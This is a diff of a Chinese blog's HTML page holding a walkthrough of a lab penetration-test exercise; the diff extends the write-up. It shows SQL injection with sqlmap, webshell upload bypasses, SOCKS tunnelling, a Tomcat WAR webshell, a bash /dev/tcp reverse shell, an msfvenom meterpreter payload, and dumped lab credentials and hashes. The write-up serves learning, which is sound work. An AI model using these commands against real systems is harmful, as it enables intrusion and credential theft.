@@ -19,16 +19,16 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  记一次综合靶场的摸底测试 &ndash; 春田花花学习荟
+  记一次自摸底底测试 &ndash; 春田花花学习会
 
     </title>
     
     
-    <meta name="description" property="og:description" content="超长文慎点。靶场说大不大，就是搞了两天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，60分。
+    <meta name="description" property="og:description" content="超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。
 |blog under go1f.cc">
     
 
-    <meta name="apple-mobile-web-app-title" content="春田花花学习荟">
+    <meta name="apple-mobile-web-app-title" content="春田花花学习会">
     
     
     <link rel="icon" href="/favicon-64.png">
@@ -40,8 +40,8 @@ if (!doNotTrack) {
     <meta name="twitter:card" content="summary">
     <meta name="twitter:site" content="@">
     <meta name="twitter:creator" content="@">
-    <meta name="twitter:title" content="记一次综合靶场的摸底测试 | 春田花花学习荟">
-    <meta name="twitter:description" content="超长文慎点。靶场说大不大，就是搞了两天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，60分。|blog under go1f.cc">
+    <meta name="twitter:title" content="记一次自摸底底测试 | 春田花花学习会">
+    <meta name="twitter:description" content="超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。|blog under go1f.cc">
     <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
     
 
@@ -58,7 +58,7 @@ if (!doNotTrack) {
       <div id="header" class="px-1 bg-white">
         <nav class="UnderlineNav UnderlineNav--right px-2">
   <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
-    春田花花学习荟
+    春田花花学习会
   </a>
 
   
@@ -92,7 +92,7 @@ if (!doNotTrack) {
 
 <div class="Subhead">
   <div class="Subhead-heading">
-    <div class="h1 mt-3 mb-1">记一次综合靶场的摸底测试</div>
+    <div class="h1 mt-3 mb-1">记一次自摸底底测试</div>
   </div>
   <div class="Subhead-description">
     
@@ -112,9 +112,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-03-01. Published at: 2020-02-29.">
+      <span title="Lastmod: 2020-03-04. Published at: 2020-02-29.">
         
-          Lastmod: 2020-03-01
+          Lastmod: 2020-03-04
         
       </span>
     </div>
@@ -124,7 +124,7 @@ if (!doNotTrack) {
 <article>
   
   <section class="pb-6 mb-3 border-bottom">
-    <p>超长文慎点。靶场说大不大，就是搞了两天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，60分。</p>
+    <p>超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。</p>
 <p>​</p>
 <p><img src="https://i.loli.net/2020/03/01/caJAsGi3SHNY86x.png" alt="拓扑.png"></p>
 <h2 id="web服务">WEB服务</h2>
@@ -149,18 +149,19 @@ if (!doNotTrack) {
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">nc -lvvp <span class="m">8000</span>
 </code></pre></div><p><img src="https://i.loli.net/2020/02/29/O4ZYtXmHPSe15CF.png" alt="11_4_reverse_shell.png"></p>
 <p>​</p>
-<p>上传文件到有读写执行权限的位置，<code>/var/www/html/upload</code> 、<code>/tmp</code> 等。</p>
+<p>提权，遇坑（模拟终端的shell是一次性的，Exp提权请先反弹shell）。没事，接着，上传文件到有读写执行权限的位置，<code>/var/www/html/upload</code> 、<code>/tmp</code> 等。</p>
 <p><img src="https://i.loli.net/2020/02/29/JIbFglPpOznrNXK.png" alt="11_4_upload_exp.png"></p>
 <p>根据 <code>phpinfo()</code> 或 <code>uname -a</code> 获知linux内核版本，上传对应可用 Exp 提权。</p>
 <p><img src="https://i.loli.net/2020/02/29/pZLyY9lJ6qK7hSH.png" alt="11_4_upgrade_privilge.png"></p>
 <p>获得flag2   flag{fab35715-9b53-477e-ab3c-08fa42e7d3db}</p>
 <p><img src="https://i.loli.net/2020/02/29/8fRVY1NiK2aEOr9.png" alt="11_4_Web_get_flag2.png"></p>
-<p>后续渗透，查看主机的网卡，多网卡就是边界机。</p>
+<p>​</p>
+<p>后续渗透，查看主机的网卡，多网卡就是边界机/跳板。</p>
 <p><img src="https://i.loli.net/2020/02/29/JycihFdkmo3se5T.png" alt="11_4_Web_eth0_172_16_12_0_24.png"></p>
 <p>​</p>
 <h2 id="oa服务">OA服务</h2>
-<p>向新发现网段 <code>172.16.12.0/24</code>，继续进发，此时需要一个代理跳板与网段主机扫描。</p>
-<p>先配置Socks代理到攻击机，此处推荐使用 reGeorgSocksProxy配套工具</p>
+<p>向新发现网段 <code>172.16.12.0/24</code>，继续进发，此时搭建一个代理再去做网段扫描。</p>
+<p>先配置Socks代理到攻击机，此处可以使用 reGeorgSocksProxy配套工具</p>
 <ol>
 <li>
 <p>上传tunnel.php脚本到靶机 <code>192.167.11.3</code> 网站目录上</p>
@@ -170,16 +171,17 @@ if (!doNotTrack) {
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">python reGeorgSocksProxy.py -u http://192.168.11.3/upload/tunnel.php -p <span class="m">1080</span>
 </code></pre></div></li>
 </ol>
-<p>​</p>
-<p>配置proxychains，添加记录 <code>socks5 192.168.11.3 1080</code></p>
-<p>对 <code>172.16.12.0/24</code> 网段扫描，注意，socks协议在会话层，ping在网络层，所以nmap配置不要ping扫描存活主机，这里使用TCP扫描，或者使用 <code>-sS</code> 的SYN扫描会更快。</p>
-<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">nmap -sT -sV -Pn -n 172.16.12.0/24
+<p>但这里是使用了EarthWorm做Socks5</p>
+<pre><code>./ew -s ssocked -l 1080
+</code></pre><p>接着，配置proxychains，添加记录 <code>socks5 192.168.11.3 1080</code></p>
+<p>对 <code>172.16.12.0/24</code> 网段扫描，注意，Socks协议在会话层，ICMP协议在网络层，所以nmap配置不要ping扫描存活主机，这里使用TCP扫描。</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">nmap -sT -Pn -n 172.16.12.0/24
 </code></pre></div><p>​</p>
 <p>发现 <code>172.16.12.103</code> 、 <code>172.16.12.104</code> 主机，一个是OA系统，一个是邮箱系统。先对OA系统进行渗透。</p>
 <p>F12 观察数据包，发现 <code>message.php?id=1</code> 有可疑</p>
 <p><img src="https://i.loli.net/2020/02/29/HESxDndYB6mOKMq.png" alt="12_103_oa_sql_inject_find.png"></p>
 <p>​</p>
-<p>单引号，逻辑判断后，确认是数字型，并且支持UNION注入。</p>
+<p>单引号、逻辑判断等常规测试后，确认是数字型UNION注入</p>
 <p><img src="https://i.loli.net/2020/02/29/XZBxswKijRJr1UD.png" alt="12_103_oa_sql_inject_union.png"></p>
 <p>​</p>
 <p>使用sqlmap，dump所有的表。获得flag3  flag{9597b462fe22}</p>
@@ -187,7 +189,7 @@ if (!doNotTrack) {
 <p>ok，有博客分享出来了，MD5 =&gt;29acd667cdbee1116d365727ca6821d3，明文=&gt;37s984pass，没看出特殊含义，能解出来就好吧。</p>
 <p><img src="https://i.loli.net/2020/02/29/lqd2hu9AsYxk13B.png" alt="12_103_oa_flag3.png"></p>
 <p>​</p>
-<p>有admin管理员，说明有后台页面，是的，就在admin目录下。</p>
+<p>有管理员表，多数有后台页面，是的，就在admin目录。</p>
 <p>登录进去，发现有上传点，尝试直接上传一句话。</p>
 <p><img src="https://i.loli.net/2020/02/29/nY3oPbEyzdTCaGQ.png" alt="12_103_oa_admin_file_upload.png"></p>
 <p>​</p>
@@ -200,15 +202,15 @@ if (!doNotTrack) {
 <p>得到flag4  flag{3d9a2e33-0f0a-41de-ae9f-fa138abc0f70}</p>
 <p><img src="https://i.loli.net/2020/02/29/fkQ3UxHJlLC5Z1S.png" alt="12_103_oa_flag4.png"></p>
 <p>​</p>
-<p>然后查看网页配置文件，发现数据库账号密码（其实已经没有大作用，先前已经扫荡过了），主要是发现一个邮箱账号密码，与邮箱网站有关。</p>
+<p>然后查看网页配置文件，发现数据库账号密码（其实已经没有大作用，先前已经扫荡过了），主要是发现一个邮箱账号密码，与后续的邮件网站有关。</p>
 <p><img src="https://i.loli.net/2020/02/29/iJNI7QnmcRwg6jV.png" alt="12_103_oa_sql_infor.png"></p>
 <p>​</p>
 <h2 id="邮件服务">邮件服务</h2>
-<p>顺利利用邮箱账户=&gt; <code>zhangming@test.com</code>   密码=&gt; <code>fgpass2814</code></p>
-<p>登录。这次真的花了不少时间发现的漏洞，Cookie的id值与个人信息挂钩。</p>
+<p>顺利利用邮箱账户=&gt; <code>zhangming@test.com</code>   密码=&gt; <code>fgpass2814</code>登录。</p>
+<p>花了不少时间发现的漏洞，Cookie的id值与个人信息挂钩。</p>
 <p><img src="https://i.loli.net/2020/02/29/5PslWjTbhQKNAxa.png" alt="12_104_mail_cookie_injection.png"></p>
 <p>​</p>
-<p>使用Burpsuit，确认注入。</p>
+<p>Burpsuit Repeat，确认注入。</p>
 <p><img src="https://i.loli.net/2020/02/29/XIiRyzrCabk4ouQ.png" alt="12_104_mail_cookie_injection_confirm.png"></p>
 <p>​</p>
 <p>Sqlmap进一步利用</p>
@@ -221,21 +223,24 @@ if (!doNotTrack) {
 <p>​</p>
 <p>一开始，发现有图片内容检测，合成图片马。</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">cat a.png a.php &gt; shell.php
-</code></pre></div><p>php上传不了有点懵，php后缀名一直没绕过，但又竟然错以为是白名单过滤，截断、小数点结尾都尝试了。忽然才发现，其实是黑名单机制，遂使用php5绕过。</p>
+</code></pre></div><p>php后缀上传不了有点懵（php后缀名没绕过，但却以为是白名单过滤，截断、小数点结尾都尝试了）。等反应过来，上传随意后缀成功了才发现，其实是黑名单机制，遂使用php5绕过。</p>
 <p><img src="https://i.loli.net/2020/02/29/paOVvKhWtf5RoPz.png" alt="12_104_mail_manage_file_upload_php5.png"></p>
+<p>小结：确定好文件上传测试流程！</p>
 <p>​</p>
 <p>Webshell get it.</p>
 <p><img src="https://i.loli.net/2020/02/29/C7PsHYwVXTFgDlE.png" alt="12_104_mail_manage_get_webshell.png"></p>
 <p>​</p>
-<p>连接蚁剑，在网站目录找到flag5?   flag{3c6ea172-7c27-438f-b440-e71f99a59b37}</p>
+<p>问题：邮箱是关键，关键flag5在哪？？</p>
+<p>连接蚁剑，在网站目录找到flag6?   flag{3c6ea172-7c27-438f-b440-e71f99a59b37}</p>
 <p>数据库账户 MyDB(&ldquo;127.0.0.1&rdquo;,&ldquo;mail&rdquo;,&ldquo;mail123456&rdquo;,&ldquo;my_mail&rdquo;);</p>
-<p>提权，本来打算上传Ubuntu3.16有效的Exp到 upload目录执行，但是提示 <code>no such file or directory</code>，搜索一下问题，大概就是Exp的架构跟Linux架构位数不一样或者其他问题。</p>
+<p>​</p>
+<p>接着提权，本来打算上传Ubuntu3.16有效的Exp到 upload目录执行，但是提示 <code>no such file or directory</code>，搜索一下问题，大概就是Exp的架构跟Linux架构位数不一样或者其他问题。</p>
 <p>偶然间，浏览的/var目录，发现tomcat，这听闻是高权限应用！头次遇上了！</p>
 <p><img src="https://i.loli.net/2020/03/01/ix3baBnoLVTHsN6.png" alt="12_104_mail_tomcat_found.png"></p>
 <p>查看netstat，感觉Web服务部署在8080端口</p>
 <p><img src="https://i.loli.net/2020/03/01/3lRcP6DvFOEw1XZ.png" alt="12_104_mail_tomcat_port.png"></p>
 <p>​</p>
-<p>之后马上学习tomcat的目录结构。主要用到这两个目录：conf(Tomcat配置文件)、 webapps(Tomcat的主要Web发布目录，存放我们自己的JSP,SERVLET,类）。</p>
+<p>之后马上学习tomcat的目录结构。主要用到这两个目录：conf(Tomcat配置文件)、 webapps(Tomcat的主要Web发布目录，存放JSP,SERVLET,类）。</p>
 <p>看到 <code>webapps/manager</code> 目录，尝试访问，需要登录认证，但有提示，账户密码可以在conf/web-user.xml查看。</p>
 <p><img src="https://i.loli.net/2020/03/01/1sxX7Fcil9OHkPh.png" alt="12_104_mail_tomcat_conf_tomcat_user.png"></p>
 <p>这应该是默认配置：tomcat/tomcat。</p>
@@ -244,15 +249,15 @@ if (!doNotTrack) {
 <p>成功登录，进入后台。</p>
 <p>可以看到该网站下发布的应用。看到上传应用接口，制作一句话的war包</p>
 <p><img src="https://i.loli.net/2020/03/01/LIOvAdb6fmUeE43.png" alt="12_104_mail_tomcat_jar_war.png"></p>
-<p>后来根据Cknife的1.jsp又打包了一次shell.war。上传成功后，得到一句话的地址</p>
+<p>后来用了Cknife的1.jsp又打包了一个shell.war。上传成功后，得到一句话的地址</p>
 <p><img src="https://i.loli.net/2020/03/01/NxV4uEryLwRqdf6.png" alt="12_104_mail_tomcat_upload_war.png"></p>
 <p>​</p>
-<p>连接Cknife，因为我的刀版本低，不支持代理，所以java配置Socks代理，选项会默认端口1080</p>
+<p>连接Cknife，因为我的刀版本低，不支持代理，所以 JVM运行时配置Socks代理，选项会默认端口1080</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">java -DsocksProxyHost<span class="o">=</span>192.168.11.3 -jar Cknife.jar
-</code></pre></div><p>cat /root/flag 得到 flag7  flag{02541512-d87c-4d13-bae8-4a9ad0ce2780}</p>
+</code></pre></div><p>​</p>
+<p>cat /root/flag 得到 flag7  flag{02541512-d87c-4d13-bae8-4a9ad0ce2780}</p>
 <p><img src="https://i.loli.net/2020/03/01/crv6ypHuQVZwKqX.png" alt="12_104_mail_tomcat_shell_flag7.png"></p>
-<p>现在就可以反弹出一个root权限的shell了。</p>
-<p>因为Cknife的模拟终端不稳定，就先反弹shell到WEB服务器<code>172.16.12.102</code>。ubuntu低版本sh对bash有点兼容问题，搜了一下，将bash反弹语句作了改进。</p>
+<p>现在就可以反弹出一个root权限的shell，反弹到WEB服务器<code>172.16.12.102</code>。ubuntu低版本sh对bash有点兼容问题，搜了一下，将bash反弹语句作了改进。</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">bash -c <span class="s1">&#39;bash -i 1&gt;&amp;/dev/tcp/172.16.12.102/8104 0&gt;&amp;1&#39;</span>
 </code></pre></div><p>还发现了新网段 <code>10.15.0.0/24</code></p>
 <p><img src="https://i.loli.net/2020/02/29/EQ1eJRFhpObgcYf.png" alt="12_104_mail_multi_eth1.png"></p>
@@ -263,7 +268,7 @@ if (!doNotTrack) {
 <p>​</p>
 <p>但是，</p>
 <h2 id="后知后觉">后知后觉</h2>
-<p>在多次因误操作断开了反弹shell后，忽然醒觉，为什么不早点用MSF？？？？？补救。。</p>
+<p>在多次因误操作断开了反弹shell后，忽然醒觉，为什么不早点用MSF？？补救……</p>
 <p>制作反弹木马，上传到WEB服务器，在之前的反弹shell里执行(希望最后一次用反弹的shell)，kali获得反弹的meterpreter</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">msfvenom -l payload <span class="p">|</span>grep meterpreter <span class="p">|</span>grep linux<span class="p">|</span>grep x64
 msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.11.2 <span class="nv">lport</span><span class="o">=</span><span class="m">7000</span> -f elf -o r7000
@@ -307,6 +312,16 @@ run
 <p>​</p>
 <p>卡死。后会有期。</p>
 <p>​</p>
+<h2 id="继续渗透">继续渗透</h2>
+<p>大家好，我已经没什么心气了。但却也更轻车熟路地，重复还原到这一步，再Fuzz。</p>
+<p>flag8 flag{10.15.0.4}</p>
+<p>发现10.15.0.4的远程桌面登录，使用admin\2_333admin登录成功。</p>
+<p>提权，查看管理员桌面，获得flag9</p>
+<p>flag9 flag{13b69f33-f205-436b-8c41-ccda0dff66e0}</p>
+<p>获得10.15.0.4的meterpreter，hashdump，有一管理员Hash</p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbe6ba371645ed310bc9fac913c75cd6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
+<p>未完待续。</p>
 <h2 id="补充小结">补充小结</h2>
 <p><strong>kill &amp; ps &amp; netstat -anotp</strong></p>
 <p>为什么学会了kill，因为反弹shell、ew等等进程反复开开关关太多次了</p>
@@ -366,12 +381,13 @@ msf &gt; db_status
           
   
     <div id="toc" class="Box Box--blue mb-3">
-      <b>记一次综合靶场的摸底测试</b><nav id="TableOfContents">
+      <b>记一次自摸底底测试</b><nav id="TableOfContents">
   <ul>
     <li><a href="#web服务">WEB服务</a></li>
     <li><a href="#oa服务">OA服务</a></li>
     <li><a href="#邮件服务">邮件服务</a></li>
     <li><a href="#后知后觉">后知后觉</a></li>
+    <li><a href="#继续渗透">继续渗透</a></li>
     <li><a href="#补充小结">补充小结</a></li>
   </ul>
 </nav></div>
